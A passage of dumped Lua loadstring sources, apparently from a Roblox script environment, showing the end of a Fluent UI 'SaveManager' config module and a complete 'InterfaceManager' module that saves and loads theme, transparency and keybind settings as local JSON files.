 216 | 
 217 |                 if name:gsub(" ", "") == "" then 
 218 |                     return self.Library:Notify({
 219 | 						Title = "Interface",
 220 | 						Content = "Config loader",
 221 | 						SubContent = "Invalid config name (empty)",
 222 | 						Duration = 7
 223 | 					})
 224 |                 end
 225 | 
 226 |                 local success, err = self:Save(name)
 227 |                 if not success then
 228 |                     return self.Library:Notify({
 229 | 						Title = "Interface",
 230 | 						Content = "Config loader",
 231 | 						SubContent = "Failed to save config: " .. err,
 232 | 						Duration = 7
 233 | 					})
 234 |                 end
 235 | 
 236 | 				self.Library:Notify({
 237 | 					Title = "Interface",
 238 | 					Content = "Config loader",
 239 | 					SubContent = string.format("Created config %q", name),
 240 | 					Duration = 7
 241 | 				})
 242 | 
 243 |                 SaveManager.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
 244 |                 SaveManager.Options.SaveManager_ConfigList:SetValue(nil)
 245 |             end
 246 |         })
 247 | 
 248 |         section:AddButton({Title = "Load config", Callback = function()
 249 | 			local name = SaveManager.Options.SaveManager_ConfigList.Value
 250 | 
 251 | 			local success, err = self:Load(name)
 252 | 			if not success then
 253 | 				return self.Library:Notify({
 254 | 					Title = "Interface",
 255 | 					Content = "Config loader",
 256 | 					SubContent = "Failed to load config: " .. err,
 257 | 					Duration = 7
 258 | 				})
 259 | 			end
 260 | 
 261 | 			self.Library:Notify({
 262 | 				Title = "Interface",
 263 | 				Content = "Config loader",
 264 | 				SubContent = string.format("Loaded config %q", name),
 265 | 				Duration = 7
 266 | 			})
 267 | 		end})
 268 | 
 269 | 		section:AddButton({Title = "Overwrite config", Callback = function()
 270 | 			local name = SaveManager.Options.SaveManager_ConfigList.Value
 271 | 
 272 | 			local success, err = self:Save(name)
 273 | 			if not success then
 274 | 				return self.Library:Notify({
 275 | 					Title = "Interface",
 276 | 					Content = "Config loader",
 277 | 					SubContent = "Failed to overwrite config: " .. err,
 278 | 					Duration = 7
 279 | 				})
 280 | 			end
 281 | 
 282 | 			self.Library:Notify({
 283 | 				Title = "Interface",
 284 | 				Content = "Config loader",
 285 | 				SubContent = string.format("Overwrote config %q", name),
 286 | 				Duration = 7
 287 | 			})
 288 | 		end})
 289 | 
 290 | 		section:AddButton({Title = "Refresh list", Callback = function()
 291 | 			SaveManager.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
 292 | 			SaveManager.Options.SaveManager_ConfigList:SetValue(nil)
 293 | 		end})
 294 | 
 295 | 		local AutoloadButton
 296 | 		AutoloadButton = section:AddButton({Title = "Set as autoload", Description = "Current autoload config: none", Callback = function()
 297 | 			local name = SaveManager.Options.SaveManager_ConfigList.Value
 298 | 			writefile(self.Folder .. "/settings/autoload.txt", name)
 299 | 			AutoloadButton:SetDesc("Current autoload config: " .. name)
 300 | 			self.Library:Notify({
 301 | 				Title = "Interface",
 302 | 				Content = "Config loader",
 303 | 				SubContent = string.format("Set %q to auto load", name),
 304 | 				Duration = 7
 305 | 			})
 306 | 		end})
 307 | 
 308 | 		if isfile(self.Folder .. "/settings/autoload.txt") then
 309 | 			local name = readfile(self.Folder .. "/settings/autoload.txt")
 310 | 			AutoloadButton:SetDesc("Current autoload config: " .. name)
 311 | 		end
 312 | 
 313 | 		SaveManager:SetIgnoreIndexes({ "SaveManager_ConfigList", "SaveManager_ConfigName" })
 314 | 	end
 315 | 
 316 | 	SaveManager:BuildFolderTree()
 317 | end
 318 | 
 319 | return SaveManager
 --- LOADSTRING SOURCE #5 ---
--- Length: 3171 bytes
--- Chunkname: loadstring

   1 | local httpService = game:GetService("HttpService")
   2 | 
   3 | local InterfaceManager = {} do
   4 | 	InterfaceManager.Folder = "FluentSettings"
   5 |     InterfaceManager.Settings = {
   6 |         Theme = "Dark",
   7 |         Acrylic = true,
   8 |         Transparency = true,
   9 |         MenuKeybind = "LeftControl"
  10 |     }
  11 | 
  12 |     function InterfaceManager:SetFolder(folder)
  13 | 		self.Folder = folder;
  14 | 		self:BuildFolderTree()
  15 | 	end
  16 | 
  17 |     function InterfaceManager:SetLibrary(library)
  18 | 		self.Library = library
  19 | 	end
  20 | 
  21 |     function InterfaceManager:BuildFolderTree()
  22 | 		local paths = {}
  23 | 
  24 | 		local parts = self.Folder:split("/")
  25 | 		for idx = 1, #parts do
  26 | 			paths[#paths + 1] = table.concat(parts, "/", 1, idx)
  27 | 		end
  28 | 
  29 | 		table.insert(paths, self.Folder)
  30 | 		table.insert(paths, self.Folder .. "/settings")
  31 | 
  32 | 		for i = 1, #paths do
  33 | 			local str = paths[i]
  34 | 			if not isfolder(str) then
  35 | 				makefolder(str)
  36 | 			end
  37 | 		end
  38 | 	end
  39 | 
  40 |     function InterfaceManager:SaveSettings()
  41 |         writefile(self.Folder .. "/options.json", httpService:JSONEncode(InterfaceManager.Settings))
  42 |     end
  43 | 
  44 |     function InterfaceManager:LoadSettings()
  45 |         local path = self.Folder .. "/options.json"
  46 |         if isfile(path) then
  47 |             local data = readfile(path)
  48 |             local success, decoded = pcall(httpService.JSONDecode, httpService, data)
  49 | 
  50 |             if success then
  51 |                 for i, v in next, decoded do
  52 |                     InterfaceManager.Settings[i] = v
  53 |                 end
  54 |             end
  55 |         end
  56 |     end
  57 | 
  58 |     function InterfaceManager:BuildInterfaceSection(tab)
  59 |         assert(self.Library, "Must set InterfaceManager.Library")
  60 | 		local Library = self.Library
  61 |         local Settings = InterfaceManager.Settings
  62 | 
  63 |         InterfaceManager:LoadSettings()
  64 | 
  65 | 		local section = tab:AddSection("Interface")
  66 | 
  67 | 		local InterfaceTheme = section:AddDropdown("InterfaceTheme", {
  68 | 			Title = "Theme",
  69 | 			Description = "Changes the interface theme.",
  70 | 			Values = Library.Themes,
  71 | 			Default = Settings.Theme,
  72 | 			Callback = function(Value)
  73 | 				Library:SetTheme(Value)
  74 |                 Settings.Theme = Value
  75 |                 InterfaceManager:SaveSettings()
  76 | 			end
  77 | 		})
  78 | 
  79 |         InterfaceTheme:SetValue(Settings.Theme)
  80 | 	
  81 | 		if Library.UseAcrylic then
  82 | 			section:AddToggle("AcrylicToggle", {
  83 | 				Title = "Acrylic",
  84 | 				Description = "The blurred background requires graphic quality 8+",
  85 | 				Default = Settings.Acrylic,
  86 | 				Callback = function(Value)
  87 | 					Library:ToggleAcrylic(Value)
  88 |                     Settings.Acrylic = Value
  89 |                     InterfaceManager:SaveSettings()
  90 | 				end
  91 | 			})
  92 | 		end
  93 | 	
  94 | 		section:AddToggle("TransparentToggle", {
  95 | 			Title = "Transparency",
  96 | 			Description = "Makes the interface transparent.",
  97 | 			Default = Settings.Transparency,
  98 | 			Callback = function(Value)
  99 | 				Library:ToggleTransparency(Value)
 100 | 				Settings.Transparency = Value
 101 |                 InterfaceManager:SaveSettings()
 102 | 			end
 103 | 		})
 104 | 	
 105 | 		local MenuKeybind = section:AddKeybind("MenuKeybind", { Title = "Minimize Bind", Default = Settings.MenuKeybind })
 106 | 		MenuKeybind:OnChanged(function()
 107 | 			Settings.MenuKeybind = MenuKeybind.Value
 108 |             InterfaceManager:SaveSettings()
 109 | 		end)
 110 | 		Library.MinimizeKeybind = MenuKeybind
 111 |     end
 112 | end
 113 | 
 114 | return InterfaceManager
